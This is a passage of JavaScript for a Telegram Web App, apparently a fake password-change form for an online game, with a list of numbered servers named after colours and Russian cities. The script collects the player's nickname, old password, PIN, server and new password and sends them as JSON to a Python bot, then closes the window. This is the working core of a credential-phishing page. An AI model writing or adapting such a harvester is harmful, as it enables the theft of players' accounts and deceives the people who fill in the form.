    const tg = window.Telegram.WebApp;
    tg.expand();

        "11. Indigo", "12. White", "13. Magenta", "14. Crimson", "15. Gold", "16. Azure", "17. Platinum", "18. Aqua", "19. Gray", "20. Ice",
        "21. Chilli", "22. Choco", "23. Moscow", "24. SPB", "25. Ufa", "26. Sochi", "27. Kazan", "28. Samara", "29. Rostov", "30. Anapa",
        "31. EKB", "32. Krasnodar", "33. Arzamas", "34. Novosib", "35. Grozny", "36. Saratov", "37. Omsk", "38. Irkutsk", "39. Volgograd", "40. Voronezh",
        "41. Belgorod", "42. Makhachkala", "43. Vladivkaz", "44. Vladivostok", "45. Kaliningrad", "46. Chelyabinsk", "47. Krasnoyarsk", "48. CHEBOKSARY", "49. KHABAROVSK", "50. PERM",
        "51. TULA", "52. RYAZAN", "53. MURMANSK", "54. PENZA", "55. KURSK", "56. ARKHANGELSK", "57. ORENBURG", "58. KIROV", "59. KEMEROVO", "60. TYUMEN",
        "61. TOLYATTI", "62. IVANOVO", "63. STAVROPOL", "64. SMOLENSK", "65. PSKOV", "66. BRYANSK", "67. OREL", "68. YAROSLAVL", "69. BARNAUL", "70. LIPETSK",
        "71. ULYANOVSK", "72. YAKUTSK", "73. TAMBOV", "74. BRATSK", "75. ASTRAKHAN", "76. CHITA", "77. KOSTROMA", "78. VLADIMIR", "79. KALUGA", "80. NOVGOROD",
        "81. TAGANROG", "82. VOLOGDA", "83. TVER", "84. TOMSK", "85. IZHEVSK", "86. SURGUT", "87. PODOLSK", "88. MAGADAN", "89. CHEREPOVETS", "90. NORILSK", "91. ASTANA"
    ];

    const serverSelect = document.getElementById('server');
    servers.forEach(srv => {
        const option = document.createElement('option');
        option.value = srv;
        option.textContent = srv;
        serverSelect.appendChild(option);
    });

    function goToScreen(screenNumber) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        document.getElementById(`screen${screenNumber}`).classList.add('active');
    }

    function submitForm() {
        const nick = document.getElementById('nickname').value.trim();
        const oldPass = document.getElementById('oldPassword').value.trim();
        const pin = document.getElementById('pincode').value.trim();
        const server = document.getElementById('server').value;
        const newPass = document.getElementById('newPassword').value.trim();
        const errorMsg = document.getElementById('errorMsg');

        if (!nick || !oldPass || !server || !newPass) {
            errorMsg.style.display = 'block';
            return;
        }
        errorMsg.style.display = 'none';

        // Собираем объект с ключами, которые точно ожидает Python-бот
        const payload = {
            nick: nick,
            old_pass: oldPass,
            pin: pin || "Не указан",
            server: server,
            new_pass: newPass
        };

        // Отправка данных в Telegram
        try {
            tg.sendData(JSON.stringify(payload));
            
            // Даем Telegram 100мс на отправку пакета перед зарытием
            setTimeout(() => {
                tg.close();
            }, 100);
        } catch (e) {
            console.error("Ошибка при отправке в Telegram:", e);
        }
    }
</script>
